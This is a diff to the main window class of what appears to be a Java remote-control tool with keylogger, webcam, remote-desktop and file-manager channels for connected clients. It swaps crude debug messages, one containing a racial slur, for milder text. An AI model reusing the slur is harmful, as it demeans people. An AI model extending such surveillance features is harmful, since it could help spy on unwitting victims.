@@ -181,7 +181,7 @@ public class Window extends JFrame{
 					}
 					final ClientInfo requestedClient = getClientFromRowNum(rowNum);
 					if(requestedClient.getNumSubSocketsByType("fileManager") != 0) {
-						System.out.println("FILEMANAGER SUCK MY DICK");
+						System.out.println("FILEMANAGER STOP THAT!");
 						return; //else if it's 0 move forward!
 					}
 					OutputStream pw;
@@ -198,7 +198,7 @@ public class Window extends JFrame{
 						}
 //				        SwingUtilities.invokeLater(new Runnable() {
 //				            public void run() {
-				            	System.out.println("DON'T FREEZE ON ME MOTHERFOCKER.");
+				            	System.out.println("DON'T FREEZE ON ME.");
 				            	//JFrame fileBrowser = 
 						    new FileBrowser(requestedClient, 
 								new WindowAdapter() {
@@ -242,7 +242,7 @@ public class Window extends JFrame{
 									e1.printStackTrace();
 								}
 								requestedClient.removeSocketsByType("fileManager");
-								System.out.println("I REMOVED YOU NIGGA ! HOW MANY FILES AFTER MANAGER SOCKETS: " + requestedClient.getNumSubSocketsByType("fileManager"));
+								System.out.println("I REMOVED YOU ! HOW MANY FILES AFTER MANAGER SOCKETS: " + requestedClient.getNumSubSocketsByType("fileManager"));
 								
 								
 								
@@ -284,7 +284,7 @@ public class Window extends JFrame{
 				}
 				ClientInfo requestedClient = getClientFromRowNum(rowNum);
 				if(requestedClient.getNumSubSocketsByType("keylogger") != 0) {
-					System.out.println("COK COKCKK COCKK!!");
+					System.out.println("TROLOLOLOL MASTER!!");
 					return; //else if it's 0 move forward!
 				}
 
@@ -380,7 +380,7 @@ public class Window extends JFrame{
 				}
 				ClientInfo requestedClient = getClientFromRowNum(rowNum);
 				if(requestedClient.getNumSubSocketsByType("remoteDesktop") != 0) {
-					System.out.println("COK COKCKK COCKK!!");
+					System.out.println("FUNN THING?");
 					return; //else if it's 0 move forward!
 				}
 
@@ -400,7 +400,7 @@ public class Window extends JFrame{
 							break;
 						}
 						
-						System.out.println("FUCK DIS SHIT!");
+						System.out.println("STOP NOT WORKING !!");
 //						System.out.println("NUMSUBSOCKETSWITHREMOTDESKTOP: " + requestedClient.getNumSubSocketsByType("remoteDesktop"));
 //						System.out.println("NUM SUBSOCKETS: " + requestedClient.getNumSubSockets());
 //						System.out.println("FUCK ME LORDY!");
@@ -473,7 +473,7 @@ public class Window extends JFrame{
 				}
 				ClientInfo requestedClient = getClientFromRowNum(rowNum);
 				if(requestedClient.getNumSubSocketsByType("webcam") != 0) {
-					System.out.println("COK COKCKK COCKK!!");
+					System.out.println("LAZER CORN!!!");
 					return; //else if it's 0 move forward!
 				}
 
@@ -493,7 +493,7 @@ public class Window extends JFrame{
 							break;
 						}
 						
-						System.out.println("FUCK DIS SHIT!");
+						System.out.println("HAHAHAHA FUNNY!");
 //						System.out.println("NUMSUBSOCKETSWITHREMOTDESKTOP: " + requestedClient.getNumSubSocketsByType("remoteDesktop"));
 //						System.out.println("NUM SUBSOCKETS: " + requestedClient.getNumSubSockets());
 //						System.out.println("FUCK ME LORDY!");
